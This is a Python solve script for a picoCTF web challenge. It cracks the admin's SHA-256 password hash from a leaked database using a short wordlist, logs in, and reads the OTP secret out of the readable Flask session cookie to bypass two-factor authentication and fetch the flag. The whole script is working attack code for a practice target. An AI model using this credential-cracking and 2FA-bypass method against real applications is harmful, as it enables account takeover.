#!/usr/bin/env python3
import base64
import hashlib
import json
import re
import sqlite3
import sys
import zlib

import requests

BASE = "http://foggy-cliff.picoctf.net:59535"


def crack_admin_password(db_path="users.db"):
    conn = sqlite3.connect(db_path)
    cur = conn.cursor()
    row = cur.execute(
        "SELECT password FROM users WHERE username='admin'"
    ).fetchone()
    conn.close()

    if not row:
        raise RuntimeError("admin user not found in users.db")

    admin_hash = row[0]

    # Small candidate list is enough for this challenge.
    # The leaked DB uses weak public-list style passwords.
    candidates = [
        "apple123",
        "apple@123",
        "mango@123",
        "password",
        "password123",
        "admin",
        "admin123",
        "qwerty",
        "letmein",
        "welcome",
    ]

    for candidate in candidates:
        if hashlib.sha256(candidate.encode()).hexdigest() == admin_hash:
            return candidate

    raise RuntimeError("Could not crack admin password from candidate list")


def b64decode_nopad(data: str) -> bytes:
    data += "=" * (-len(data) % 4)
    return base64.urlsafe_b64decode(data.encode())


def decode_flask_session_payload(cookie_value: str):
    """
    Flask session cookies are signed, not encrypted.
    We only need to decode the payload segment to read otp_secret.
    Supports both compressed and uncompressed Flask cookies.
    """
    parts = cookie_value.split(".")

    if cookie_value.startswith("."):
        # Format: .<payload>.<timestamp>.<sig>
        payload_b64 = parts[1]
        raw = b64decode_nopad(payload_b64)
        raw = zlib.decompress(raw)
    else:
        # Format: <payload>.<timestamp>.<sig>
        payload_b64 = parts[0]
        raw = b64decode_nopad(payload_b64)

    return json.loads(raw.decode())


def extract_flag(text: str):
    m = re.search(r"picoCTF\{.*?\}", text, re.DOTALL)
    return m.group(0) if m else None


def main():
    try:
        admin_password = crack_admin_password("users.db")
    except Exception as e:
        print(f"[-] Failed to recover admin password: {e}")
        sys.exit(1)

    print(f"[+] Cracked admin password: {admin_password}")

    s = requests.Session()

    # Step 1: login as admin
    r = s.post(
        f"{BASE}/login",
        data={"username": "admin", "password": admin_password},
        allow_redirects=False,
        timeout=10,
    )

    if "session" not in s.cookies:
        print("[-] No session cookie received")
        print(r.text)
        sys.exit(1)

    # Step 2: decode OTP from the Flask session cookie
    session_cookie = s.cookies.get("session")
    session_data = decode_flask_session_payload(session_cookie)
    print(f"[+] Decoded session: {session_data}")

    otp = session_data.get("otp_secret")
    if not otp:
        print("[-] otp_secret not found in session")
        sys.exit(1)

    print(f"[+] OTP: {otp}")

    # Step 3: submit OTP
    r = s.post(
        f"{BASE}/two_fa",
        data={"otp": otp},
        allow_redirects=True,
        timeout=10,
    )

    # Step 4: fetch homepage and grab flag
    r = s.get(f"{BASE}/", timeout=10)
    flag = extract_flag(r.text)

    if flag:
        print(f"[+] FLAG FOUND: {flag}")
    else:
        print("[-] Flag not found")
        print(r.text)


if __name__ == "__main__":
    main()
